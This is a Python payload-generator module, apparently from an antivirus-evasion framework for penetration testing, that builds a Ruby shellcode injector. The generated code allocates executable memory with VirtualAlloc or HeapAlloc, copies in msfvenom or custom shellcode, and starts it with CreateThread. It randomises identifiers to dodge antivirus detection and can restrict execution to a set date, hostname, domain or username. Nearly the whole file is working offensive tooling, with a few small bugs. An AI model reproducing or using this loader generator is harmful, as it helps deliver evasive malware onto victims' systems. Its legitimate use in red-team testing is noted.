"""

Ruby inline shellcode injector

TODO: better randomization


"""

from datetime import date
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "VirtualAlloc pattern for shellcode injection"
        self.language = "ruby"
        self.extension = "rb"
        self.rating = "Normal"
        self.name = "Ruby Flat Injection"
        self.path = "ruby/shellcode_inject/flat"
        self.cli_opts = cli_obj
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user ineraction for- format is {Option : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Only run on specified hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "USERNAME"       : ["X", "Optional: The required user account"]
        }

    def generate(self):

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_ends_required = 0
        payload_code = ''

        payload_code = "require 'rubygems'\n"
        payload_code += "require 'win32/api'\n"
        payload_code += "include Win32\n"

        # Add logic for adding this line, stupid bug and I have no idea
        # why this is even a problem, but ruby is dumb
        if self.required_options["EXPIRE_PAYLOAD"][0] != "X" or self.required_options["HOSTNAME"][0] != "X" or self.required_options["DOMAIN"][0] != "X" or self.required_options["USERNAME"][0] != "X":
            pass
        else:
            payload_code += "exit if Object.const_defined?(:Ocra)\n"

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            year = date.today().year
            month = date.today().month
            day = date.today().day

            # Create Payload code
            payload_code += 'require \'date\'\n'
            payload_code += 'if Date.today < Date.parse(\'' + year + '-' + month + '-' + day + '\').next_day(' + self.required_options["EXPIRE_PAYLOAD"][0] + ')\n'

            # Add a tab for this check
            num_ends_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            payload_code += 'require \'socket\'\n'
            payload_code += 'hostname = Socket.gethostname.downcase\n'
            payload_code += 'if hostname[\"' + self.required_options["HOSTNAME"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_ends_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            payload_code += 'require \'socket\'\n'
            payload_code += 'domain = Socket.gethostname.downcase\n'
            payload_code += 'if domain[\"' + self.required_options["DOMAIN"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_ends_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            payload_code += 'name = ENV["USERNAME"].downcase\n'
            payload_code += 'if name[\"' + self.required_options["USERNAME"][0].lower() + '\"]\n'

            # Add a tab for this check
            num_ends_required += 1

        # randomly generate out variable names
        payloadName = evasion_helpers.randomString()
        ptrName = evasion_helpers.randomString()
        threadName = evasion_helpers.randomString()
        heap_name = evasion_helpers.randomString()
        valloc_random = evasion_helpers.randomString()
        rtlmove_random = evasion_helpers.randomString()
        createthread_random = evasion_helpers.randomString()
        waitfor_random = evasion_helpers.randomString()
        heapcreate_random = evasion_helpers.randomString()
        heapalloc_random = evasion_helpers.randomString()

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += valloc_random + " = API.new('VirtualAlloc', 'IIII', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
            payload_code += "%s = \"%s\"\n" %(payloadName, Shellcode)
            payload_code += ptrName + " = " + valloc_random + ".call(0,(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0x1000, 0x40)\n"

        elif self.required_options["INJECT_METHOD"][0].lower() == "heap":
            payload_code += heapcreate_random + " = API.new('HeapCreate', 'III', 'I');" + heapalloc_random + " = API.new('HeapAlloc', 'III', 'I');" + rtlmove_random + " = API.new('RtlMoveMemory', 'IPI', 'V');" + createthread_random + " = API.new('CreateThread', 'IIIIIP', 'I');" + waitfor_random + " = API.new('WaitForSingleObject', 'II', 'I')\n"
            payload_code += "%s = \"%s\"\n" %(payloadName, Shellcode)
            payload_code += heap_name + " = " + heapcreate_random + ".call(0x0004,(" + payloadName + ".length > 0x1000 ? " + payloadName + ".length : 0x1000), 0)\n"
            payload_code += ptrName + " = " + heapalloc_random + ".call(" + heap_name + ", 0x00000008, " + payloadName + ".length)\n"

        payload_code += "x = " + rtlmove_random + ".call(" + ptrName + "," + payloadName + "," + payloadName + ".length); " + threadName + " = " + createthread_random + ".call(0,0," + ptrName + ",0,0,0); x = " + waitfor_random + ".call(" + threadName + ",0xFFFFFFF)\n"

        # Close out all the if statements
        for iteration in range(num_ends_required):
            payload_code += 'end\n'

        self.payload_source_code = payload_code
        return
